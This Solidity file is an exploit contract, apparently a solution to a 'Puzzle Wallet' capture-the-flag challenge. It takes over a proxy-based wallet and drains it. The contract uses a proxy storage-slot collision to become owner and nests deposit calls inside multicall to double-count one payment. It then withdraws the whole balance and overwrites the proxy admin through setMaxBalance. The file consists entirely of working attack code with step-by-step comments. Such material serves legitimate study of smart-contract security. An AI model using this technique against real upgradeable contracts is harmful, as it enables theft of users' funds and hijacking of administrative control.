// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "./PuzzleWallet.sol";

contract PuzzleProxyExploit {

    PuzzleProxy public immutable proxy;
    PuzzleWallet public immutable wallet;

    constructor(address payable _puzzleWallet) public {
        proxy = PuzzleProxy(_puzzleWallet);
        wallet = PuzzleWallet(_puzzleWallet);
    }

    bytes[] private topLevelCalls;
    bytes[] private nestedCall;
    function exploit(address newAdmin) public payable {
        require(msg.value == 1000000000000000);

        // Set `pendingAdmin` in proxy to this address to change `owner` in wallet
        proxy.proposeNewAdmin(address(this));
        // We're the owner now so we can add ourself to the whitelist
        wallet.addToWhitelist(address(this));

        // The first call to multicall will be deposit
        // The second call will be a call to multicall, which itself calls deposit
        // This allows us to deposit twice, which increases our balance by 2 * msg.value
        // (we can repeat this an arbitrary number of times)
        topLevelCalls.push(
            abi.encodeWithSelector(PuzzleWallet.deposit.selector)
        );
        nestedCall.push(
            abi.encodeWithSelector(PuzzleWallet.deposit.selector)
        );
        topLevelCalls.push(
            abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedCall)
        );
        wallet.multicall{value: msg.value}(topLevelCalls);

        // Now our balance equals the total contract balance
        // so we can drain it via `execute`
        bytes memory callData;
        wallet.execute(
            newAdmin,
            2000000000000000,
            callData
        );

        // We can finally set the max balance now that the wallet balance is 0.
        // Updating maxBalance in the wallet updates the admin in the proxy
        wallet.setMaxBalance(uint256(newAdmin));
    }
}
